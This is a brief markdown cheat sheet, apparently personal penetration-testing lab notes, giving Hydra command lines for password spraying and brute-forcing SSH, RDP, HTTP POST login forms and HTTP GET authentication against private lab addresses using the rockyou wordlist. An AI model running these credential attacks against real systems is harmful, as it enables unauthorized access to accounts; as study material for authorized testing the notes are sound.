# Password spray
## Hydra

- ssh
- ``` hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201  ```
- rdp
- ``` hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202 ```
- port 
- ``` -s ```

- care 302 redirect
- HTTP POST Form
  ``` hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid" ```
- HTTP GET
  ``` hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.152.201 http-get "/index.php" ```



## 